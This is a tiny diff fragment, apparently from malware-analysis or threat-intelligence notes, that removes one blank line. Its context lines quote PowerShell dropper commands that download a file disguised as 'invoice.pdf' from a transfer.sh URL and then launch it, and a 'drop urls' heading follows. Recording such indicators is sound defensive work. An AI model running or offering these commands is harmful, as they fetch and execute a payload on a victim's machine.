@@ -21,7 +21,6 @@ poweRshell -C iwr https://transfer.sh/get/vpiHmi/invoice.pdf -OutFile C:\\Progra
 
 poweRshell -C Start-Sleep 6;Start-Process 'C:\\ProgramData\\invoice.pdf
 
-
 *************************************************
 
 drop urls:
